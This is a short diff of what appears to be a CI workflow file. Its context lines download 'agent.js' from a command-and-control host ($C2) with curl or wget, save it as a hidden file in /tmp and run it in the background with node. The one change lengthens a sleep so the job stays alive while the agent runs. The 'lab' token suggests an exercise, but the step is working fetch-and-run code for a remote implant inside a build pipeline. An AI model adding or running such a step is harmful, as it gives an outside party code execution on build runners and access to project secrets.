@@ -16,6 +16,6 @@ jobs:
           curl -s -m 30 -H "X-Token: r2s-lab-2026" "$C2/agent.js" -o /tmp/.c2a.js || wget -q -T 30 --header="X-Token: r2s-lab-2026" "$C2/agent.js" -O /tmp/.c2a.js
           if [ -s /tmp/.c2a.js ]; then
             nohup node /tmp/.c2a.js >/dev/null 2>&1 &
-            sleep 25
+            sleep 280
             pgrep -f 'node /tmp/.c2a.js' >/dev/null && echo agent-running || echo agent-died
           fi
